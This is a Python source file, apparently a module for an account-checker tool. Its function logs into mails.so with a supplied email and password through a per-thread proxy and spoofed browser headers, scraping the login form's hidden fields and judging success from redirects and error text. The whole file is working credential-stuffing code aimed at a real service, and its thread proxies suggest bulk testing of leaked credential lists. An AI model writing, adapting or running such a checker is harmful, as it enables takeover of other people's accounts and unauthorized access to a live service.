"""
Checker for mails.so – form-based login (GET login page, POST to form action).
"""
import re
import requests
import threading
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from typing import Tuple

BASE_URL = "https://mails.so"
LOGIN_PAGE = BASE_URL + "/login"
TIMEOUT = 15

def check(email: str, password: str) -> Tuple[bool, str]:
    proxy = getattr(threading.current_thread(), 'proxy', None)

    session = requests.Session()
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Origin": BASE_URL,
        "Referer": LOGIN_PAGE,
    })

    try:
        # Step 1: GET login page to extract form and tokens
        resp = session.get(LOGIN_PAGE, timeout=TIMEOUT)
        if resp.status_code != 200:
            return False, f"Failed to load login page (HTTP {resp.status_code})"

        soup = BeautifulSoup(resp.text, 'html.parser')
        form = soup.find('form')
        if not form:
            return False, "No login form found on page"

        # Form action
        action = form.get('action', '')
        if action:
            submit_url = urljoin(LOGIN_PAGE, action)
        else:
            submit_url = LOGIN_PAGE

        # Extract all input fields (hidden and visible)
        payload = {}
        email_field = None
        password_field = None
        for inp in form.find_all('input'):
            name = inp.get('name')
            if not name:
                continue
            value = inp.get('value', '')
            input_type = inp.get('type', 'text')

            if input_type == 'hidden':
                payload[name] = value
            elif input_type in ['text', 'email'] or 'email' in name.lower():
                email_field = name
            elif input_type == 'password' or 'password' in name.lower():
                password_field = name

        # If we didn't find email/password fields, try common names
        if not email_field:
            for possible in ['email', 'username', 'user', 'login']:
                if possible in payload:
                    email_field = possible
                    break
        if not password_field:
            for possible in ['password', 'pass', 'pwd']:
                if possible in payload:
                    password_field = possible
                    break

        if not email_field or not password_field:
            return False, "Could not identify email/password fields"

        # Fill credentials
        payload[email_field] = email
        payload[password_field] = password

        # Step 2: POST credentials
        post_resp = session.post(submit_url, data=payload, allow_redirects=True, timeout=TIMEOUT)

        # Step 3: Check success – look for redirect to dashboard
        final_url = post_resp.url.lower()
        if "login" not in final_url and "signin" not in final_url:
            # Redirected away from login page – likely success
            return True, "Login successful"

        # Check for error messages on the page
        html = post_resp.text.lower()
        if "invalid" in html or "incorrect" in html:
            return False, "Login failed: Invalid credentials"

        # Check for any error alert
        if "error" in html and "login" in html:
            return False, "Login failed: Error message on page"

        # If we're still on login page, assume failure
        if "login" in final_url or "signin" in final_url:
            return False, "Login failed – still on login page"

        return False, "Login failed – unknown reason"

    except requests.exceptions.Timeout:
        return False, "Request timed out"
    except requests.exceptions.ConnectionError:
        return False, "Connection error"
    except Exception as e:
        return False, f"Unexpected error: {str(e)}"